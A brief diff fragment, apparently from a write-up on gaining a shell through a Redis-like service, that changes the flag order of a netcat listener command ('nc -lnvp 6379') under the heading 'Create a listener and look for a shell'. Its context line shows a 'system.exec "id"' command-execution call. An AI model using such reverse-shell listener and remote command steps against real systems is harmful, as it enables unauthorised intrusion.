@@ -35,7 +35,7 @@ system.exec "id"
 Create a listener and look for a shell:
 You
 ```
-nc -lvnp 6379
+nc -lnvp 6379
 ```
 target:
 ```
